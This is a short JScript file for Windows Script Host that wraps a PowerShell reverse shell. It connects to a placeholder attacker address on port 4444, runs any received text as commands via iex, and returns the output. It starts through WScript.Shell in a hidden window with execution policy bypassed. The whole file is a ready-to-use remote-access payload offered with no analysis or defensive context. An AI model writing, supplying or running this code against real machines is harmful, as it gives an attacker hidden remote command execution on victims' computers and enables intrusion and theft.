// revshell_ps.js — One-liner WSH wrapper for PowerShell reverse shell
var attacker = "YOUR_IP";
var port = 4444;

var cmd = 'powershell -ep bypass -c "$client=New-Object System.Net.Sockets.TCPClient(\'' + 
          attacker + '\',' + port + 
          ');$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length))-ne 0){;$data=([text.encoding]::ASCII).GetString($b,0,$i);$s=(iex $data 2>&1|Out-String);$s2=$s+\'PS \'+(pwd)+\'> \';$sb=([text.encoding]::ASCII).GetBytes($s2);$stream.Write($sb,0,$sb.Length)};$client.Close()"';

var shell = new ActiveXObject("WScript.Shell");
shell.Run(cmd, 0, false); // hidden window
WScript.Quit();
